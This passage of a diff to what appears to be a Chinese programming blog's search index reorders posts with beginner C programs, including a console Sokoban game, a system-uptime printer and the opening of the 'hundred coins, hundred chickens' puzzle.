class="number">1</span>][y] == <span class="number">0</span> || <span class="built_in">map</span>[x+<span class="number">1</span>][y] == <span class="number">4</span>)	<span class="comment">// 人的前面位置为 空白 或者 人的前面值目的地 </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">map</span>[x+<span class="number">1</span>][y] +=<span class="number">2</span>;</span><br><span class="line">			&#125;						<span class="comment">//0 空地,1墙，2人，3箱子，4目的地，7达到目的地  一个隐藏的6也是表示人，只不过这人站在目的地上面。</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">map</span>[x+<span class="number">1</span>][y] == <span class="number">3</span> || <span class="built_in">map</span>[x+<span class="number">1</span>][y] == <span class="number">7</span>) </span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[x+<span class="number">2</span>][y] == <span class="number">0</span> || <span class="built_in">map</span>[x+<span class="number">2</span>][y] == <span class="number">4</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">					<span class="built_in">map</span>[x+<span class="number">1</span>][y] -=<span class="number">1</span>; <span class="comment">// 箱子变人</span></span><br><span class="line">					<span class="built_in">map</span>[x+<span class="number">2</span>][y] +=<span class="number">3</span>; <span class="comment">// 箱子前面 的空地变成 箱子  </span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">// 左</span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">'A'</span>:<span class="keyword">case</span> <span class="string">'a'</span>:<span class="keyword">case</span> <span class="number">75</span>:</span><br><span class="line">			<span class="keyword">if</span>( <span class="built_in">map</span>[x][y<span class="number">-1</span>] == <span class="number">0</span> || <span class="built_in">map</span>[x][y<span class="number">-1</span>] == <span class="number">4</span>)	<span class="comment">// 人的前面位置为 空白 或者 人的前面值目的地 </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">map</span>[x][y<span class="number">-1</span>] +=<span class="number">2</span>;</span><br><span class="line">			&#125;						<span class="comment">//0 空地,1墙，2人，3箱子，4目的地，7达到目的地  一个隐藏的6也是表示人，只不过这人站在目的地上面。</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">map</span>[x][y<span class="number">-1</span>] == <span class="number">3</span> || <span class="built_in">map</span>[x][y<span class="number">-1</span>] == <span class="number">7</span>) </span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[x][y<span class="number">-2</span>] == <span class="number">0</span> || <span class="built_in">map</span>[x][y<span class="number">-2</span>] == <span class="number">4</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">					<span class="built_in">map</span>[x][y<span class="number">-1</span>] -=<span class="number">1</span>; <span class="comment">// 箱子变人</span></span><br><span class="line">					<span class="built_in">map</span>[x][y<span class="number">-2</span>] +=<span class="number">3</span>; <span class="comment">// 箱子前面 的空地变成 箱子  </span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">// 右</span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">'D'</span>:<span class="keyword">case</span> <span class="string">'d'</span>:<span class="keyword">case</span> <span class="number">77</span>:</span><br><span class="line">			<span class="keyword">if</span>( <span class="built_in">map</span>[x][y+<span class="number">1</span>] == <span class="number">0</span> || <span class="built_in">map</span>[x][y+<span class="number">1</span>] == <span class="number">4</span>)	<span class="comment">// 人的前面位置为 空白 或者 人的前面值目的地 </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">map</span>[x][y+<span class="number">1</span>] +=<span class="number">2</span>;</span><br><span class="line">			&#125;						<span class="comment">//0 空地,1墙，2人，3箱子，4目的地，7达到目的地  一个隐藏的6也是表示人，只不过这人站在目的地上面。</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">map</span>[x][y+<span class="number">1</span>] == <span class="number">3</span> || <span class="built_in">map</span>[x][y+<span class="number">1</span>] == <span class="number">7</span>) </span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[x][y+<span class="number">2</span>] == <span class="number">0</span> || <span class="built_in">map</span>[x][y+<span class="number">2</span>] == <span class="number">4</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">					<span class="built_in">map</span>[x][y+<span class="number">1</span>] -=<span class="number">1</span>; <span class="comment">// 箱子变人</span></span><br><span class="line">					<span class="built_in">map</span>[x][y+<span class="number">2</span>] +=<span class="number">3</span>; <span class="comment">// 箱子前面 的空地变成 箱子  </span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		 </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取人的坐标</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">x_y</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;H;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;L;j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[i][j] == <span class="number">2</span>||<span class="built_in">map</span>[i][j] == <span class="number">6</span>)</span><br><span class="line">					&#123;x=i;y=j;&#125;</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"人的坐标(%d,%d)\n"</span>,x,y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 自动求得箱子个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">boxs_num</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,boxs=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;H;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;L;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">map</span>[i][j] == <span class="number">3</span>)</span><br><span class="line">				boxs++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>( boxs == <span class="number">0</span> )</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"游戏结束!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2020/04/17/推箱子/tuixiangzi.gif" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C语言有趣程序</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>开机时间</title>
-    <url>/2019/08/24/%E5%BC%80%E6%9C%BA%E6%97%B6%E9%97%B4/</url>
-    <content><![CDATA[<h1 id="获取系统已开机时间"><a href="#获取系统已开机时间" class="headerlink" title="获取系统已开机时间"></a>获取系统已开机时间</h1><p>来自百度  </p>
-<p>源代码：  </p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD k = GetTickCount();</span><br><span class="line">    <span class="keyword">int</span> s = k/<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">min</span> = <span class="number">0</span>, h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (s &gt;= <span class="number">60</span>)&#123;</span><br><span class="line">        <span class="built_in">min</span> = s / <span class="number">60</span>;</span><br><span class="line">        s = s % <span class="number">60</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">min</span> &gt;= <span class="number">60</span>)&#123;</span><br><span class="line">        h = <span class="built_in">min</span> / <span class="number">60</span>;</span><br><span class="line">        <span class="built_in">min</span> = <span class="built_in">min</span> % <span class="number">60</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"系统启动到现在过了的时间：%d h %d min %d s\n"</span>,h,<span class="built_in">min</span>,s);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/08/24/开机时间/k.jpg" alt></p>
-<p>获取链接：<a href="https://pan.baidu.com/s/1AYwAtcfYgsZrChTmc109AQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1AYwAtcfYgsZrChTmc109AQ</a></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-        <tag>C语言有趣程序</tag>
       </tags>
   </entry>
   <entry>
@@ -1080,6 +1058,46 @@
       </categories>
       <tags>
         <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>开机时间</title>
+    <url>/2019/08/24/%E5%BC%80%E6%9C%BA%E6%97%B6%E9%97%B4/</url>
+    <content><![CDATA[<h1 id="获取系统已开机时间"><a href="#获取系统已开机时间" class="headerlink" title="获取系统已开机时间"></a>获取系统已开机时间</h1><p>来自百度  </p>
+<p>源代码：  </p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD k = GetTickCount();</span><br><span class="line">    <span class="keyword">int</span> s = k/<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">min</span> = <span class="number">0</span>, h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (s &gt;= <span class="number">60</span>)&#123;</span><br><span class="line">        <span class="built_in">min</span> = s / <span class="number">60</span>;</span><br><span class="line">        s = s % <span class="number">60</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">min</span> &gt;= <span class="number">60</span>)&#123;</span><br><span class="line">        h = <span class="built_in">min</span> / <span class="number">60</span>;</span><br><span class="line">        <span class="built_in">min</span> = <span class="built_in">min</span> % <span class="number">60</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"系统启动到现在过了的时间：%d h %d min %d s\n"</span>,h,<span class="built_in">min</span>,s);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：  </p>
+<p><img src="//czheisenberg.github.io/2019/08/24/开机时间/k.jpg" alt></p>
+<p>获取链接：<a href="https://pan.baidu.com/s/1AYwAtcfYgsZrChTmc109AQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1AYwAtcfYgsZrChTmc109AQ</a></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+        <tag>C语言有趣程序</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>推箱子</title>
+    <url>/2020/04/17/%E6%8E%A8%E7%AE%B1%E5%AD%90/</url>
+    <content><![CDATA[<h1 id="推箱子单关卡"><a href="#推箱子单关卡" class="headerlink" title="推箱子单关卡"></a>推箱子单关卡</h1><p>初次使用二维数组并编写经典小游戏：推箱子！（单关卡）</p>
+<p>注：查阅过百度，烦请喷哥留德。  </p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> L 8</span></span><br><span class="line"><span class="keyword">int</span> x,y; <span class="comment">// 全局变量存储人的坐标 </span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[H][L]=</span><br><span class="line">&#123;</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">	&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>&#125;,</span><br><span class="line">	&#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">	&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125; 	<span class="comment">//0 空地,1墙，2人，3箱子，4目的地，7达到目的地  一个隐藏的6也是表示人，只不过这人站在目的地上面。 </span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">draw_map</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">x_y</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		system(<span class="string">"cls"</span>);</span><br><span class="line">		draw_map();</span><br><span class="line">		<span class="built_in">move</span>();	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出图形 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">draw_map</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;H;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;L;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">switch</span>(<span class="built_in">map</span>[i][j])	<span class="comment">// 0=空地，1=墙，2=人，3=箱子，4=目的地； </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">printf</span>(<span class="string">"--"</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">1</span>:<span class="built_in">printf</span>(<span class="string">"■"</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">2</span>:<span class="built_in">printf</span>(<span class="string">"♀"</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">3</span>:<span class="built_in">printf</span>(<span class="string">"◆"</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">4</span>:<span class="built_in">printf</span>(<span class="string">"¤"</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">6</span>:<span class="built_in">printf</span>(<span class="string">"♂"</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">7</span>:<span class="built_in">printf</span>(<span class="string">"★"</span>);<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 移动 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	x_y();</span><br><span class="line">	boxs_num() ;</span><br><span class="line">	<span class="keyword">char</span> WASD;</span><br><span class="line">	WASD =_getch();</span><br><span class="line">	<span class="keyword">switch</span>(WASD)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 上 </span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">'W'</span>:<span class="keyword">case</span> <span class="string">'w'</span>:<span class="keyword">case</span> <span class="number">72</span>:</span><br><span class="line">			<span class="keyword">if</span>( <span class="built_in">map</span>[x<span class="number">-1</span>][y] == <span class="number">0</span> || <span class="built_in">map</span>[x<span class="number">-1</span>][y] == <span class="number">4</span>)	<span class="comment">// 人的前面位置为 空白 或者 人的前面值目的地 </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">map</span>[x<span class="number">-1</span>][y] +=<span class="number">2</span>;</span><br><span class="line">			&#125;						<span class="comment">//0 空地,1墙，2人，3箱子，4目的地，7达到目的地  一个隐藏的6也是表示人，只不过这人站在目的地上面。</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">map</span>[x<span class="number">-1</span>][y] == <span class="number">3</span> || <span class="built_in">map</span>[x<span class="number">-1</span>][y] == <span class="number">7</span>) </span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[x<span class="number">-2</span>][y] == <span class="number">0</span> || <span class="built_in">map</span>[x<span class="number">-2</span>][y] == <span class="number">4</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">					<span class="built_in">map</span>[x<span class="number">-1</span>][y] -=<span class="number">1</span>; <span class="comment">// 箱子变人</span></span><br><span class="line">					<span class="built_in">map</span>[x<span class="number">-2</span>][y] +=<span class="number">3</span>; <span class="comment">// 箱子前面 的空地变成 箱子  </span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 下</span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">'S'</span>:<span class="keyword">case</span> <span class="string">'s'</span>:<span class="keyword">case</span> <span class="number">80</span>:</span><br><span class="line">			<span class="keyword">if</span>( <span class="built_in">map</span>[x+<span class="number">1</span>][y] == <span class="number">0</span> || <span class="built_in">map</span>[x+<span class="number">1</span>][y] == <span class="number">4</span>)	<span class="comment">// 人的前面位置为 空白 或者 人的前面值目的地 </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">map</span>[x+<span class="number">1</span>][y] +=<span class="number">2</span>;</span><br><span class="line">			&#125;						<span class="comment">//0 空地,1墙，2人，3箱子，4目的地，7达到目的地  一个隐藏的6也是表示人，只不过这人站在目的地上面。</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">map</span>[x+<span class="number">1</span>][y] == <span class="number">3</span> || <span class="built_in">map</span>[x+<span class="number">1</span>][y] == <span class="number">7</span>) </span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[x+<span class="number">2</span>][y] == <span class="number">0</span> || <span class="built_in">map</span>[x+<span class="number">2</span>][y] == <span class="number">4</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">					<span class="built_in">map</span>[x+<span class="number">1</span>][y] -=<span class="number">1</span>; <span class="comment">// 箱子变人</span></span><br><span class="line">					<span class="built_in">map</span>[x+<span class="number">2</span>][y] +=<span class="number">3</span>; <span class="comment">// 箱子前面 的空地变成 箱子  </span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">// 左</span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">'A'</span>:<span class="keyword">case</span> <span class="string">'a'</span>:<span class="keyword">case</span> <span class="number">75</span>:</span><br><span class="line">			<span class="keyword">if</span>( <span class="built_in">map</span>[x][y<span class="number">-1</span>] == <span class="number">0</span> || <span class="built_in">map</span>[x][y<span class="number">-1</span>] == <span class="number">4</span>)	<span class="comment">// 人的前面位置为 空白 或者 人的前面值目的地 </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">map</span>[x][y<span class="number">-1</span>] +=<span class="number">2</span>;</span><br><span class="line">			&#125;						<span class="comment">//0 空地,1墙，2人，3箱子，4目的地，7达到目的地  一个隐藏的6也是表示人，只不过这人站在目的地上面。</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">map</span>[x][y<span class="number">-1</span>] == <span class="number">3</span> || <span class="built_in">map</span>[x][y<span class="number">-1</span>] == <span class="number">7</span>) </span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[x][y<span class="number">-2</span>] == <span class="number">0</span> || <span class="built_in">map</span>[x][y<span class="number">-2</span>] == <span class="number">4</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">					<span class="built_in">map</span>[x][y<span class="number">-1</span>] -=<span class="number">1</span>; <span class="comment">// 箱子变人</span></span><br><span class="line">					<span class="built_in">map</span>[x][y<span class="number">-2</span>] +=<span class="number">3</span>; <span class="comment">// 箱子前面 的空地变成 箱子  </span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">// 右</span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">'D'</span>:<span class="keyword">case</span> <span class="string">'d'</span>:<span class="keyword">case</span> <span class="number">77</span>:</span><br><span class="line">			<span class="keyword">if</span>( <span class="built_in">map</span>[x][y+<span class="number">1</span>] == <span class="number">0</span> || <span class="built_in">map</span>[x][y+<span class="number">1</span>] == <span class="number">4</span>)	<span class="comment">// 人的前面位置为 空白 或者 人的前面值目的地 </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">map</span>[x][y+<span class="number">1</span>] +=<span class="number">2</span>;</span><br><span class="line">			&#125;						<span class="comment">//0 空地,1墙，2人，3箱子，4目的地，7达到目的地  一个隐藏的6也是表示人，只不过这人站在目的地上面。</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">map</span>[x][y+<span class="number">1</span>] == <span class="number">3</span> || <span class="built_in">map</span>[x][y+<span class="number">1</span>] == <span class="number">7</span>) </span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[x][y+<span class="number">2</span>] == <span class="number">0</span> || <span class="built_in">map</span>[x][y+<span class="number">2</span>] == <span class="number">4</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">					<span class="built_in">map</span>[x][y+<span class="number">1</span>] -=<span class="number">1</span>; <span class="comment">// 箱子变人</span></span><br><span class="line">					<span class="built_in">map</span>[x][y+<span class="number">2</span>] +=<span class="number">3</span>; <span class="comment">// 箱子前面 的空地变成 箱子  </span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		 </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取人的坐标</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">x_y</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;H;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;L;j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[i][j] == <span class="number">2</span>||<span class="built_in">map</span>[i][j] == <span class="number">6</span>)</span><br><span class="line">					&#123;x=i;y=j;&#125;</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"人的坐标(%d,%d)\n"</span>,x,y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 自动求得箱子个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">boxs_num</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,boxs=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;H;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;L;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">map</span>[i][j] == <span class="number">3</span>)</span><br><span class="line">				boxs++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>( boxs == <span class="number">0</span> )</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"游戏结束!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：  </p>
+<p><img src="//czheisenberg.github.io/2020/04/17/推箱子/tuixiangzi.gif" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C语言有趣程序</tag>
       </tags>
   </entry>
   <entry>
@@ -1237,6 +1255,27 @@
       </tags>
   </entry>
   <entry>
+    <title>百钱买鸡</title>
+    <url>/2019/08/27/%E7%99%BE%E9%92%B1%E4%B9%B0%E9%B8%A1/</url>
+    <content><![CDATA[<h1 id="百钱买鸡"><a href="#百钱买鸡" class="headerlink" title="百钱买鸡"></a>百钱买鸡</h1><p>我国古代数学家张丘建在他的《算经》中提出了一个著名的“百钱买百鸡问题”：  </p>
+<p>鸡翁一，值钱五，鸡母一，值钱三，鸡雏三，值钱一，百钱买百鸡，问翁、母、雏各几何？</p>
+<p>公鸡一只五元，母鸡一只三元，小鸡崽崽三只一元。</p>
+<p>源代码：  </p>
+<a id="more"></a>
+
